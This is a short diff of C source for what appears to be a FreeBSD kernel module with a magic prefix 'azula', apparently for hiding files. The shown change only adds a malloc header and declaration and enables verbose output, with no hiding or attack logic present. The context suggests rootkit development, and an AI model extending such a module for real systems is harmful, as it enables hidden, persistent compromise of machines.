@@ -32,12 +32,15 @@
 #include <sys/uio.h>
 #include <sys/ioccom.h>
 #include <sys/dirent.h>
+#include <sys/malloc.h>
 
 #include <vm/vm.h>
 #include <vm/vm_page.h> 
 #include <vm/vm_map.h>
 
-#define VERBOSE 0
+#define VERBOSE 1
 
 #define MAGIC_PREFIX "azula"
 
+MALLOC_DECLARE(M_TEMPBUFFER);
+MALLOC_DEFINE(M_TEMPBUFFER, "SHORT DESCRIP", "LONG DESCRIP");
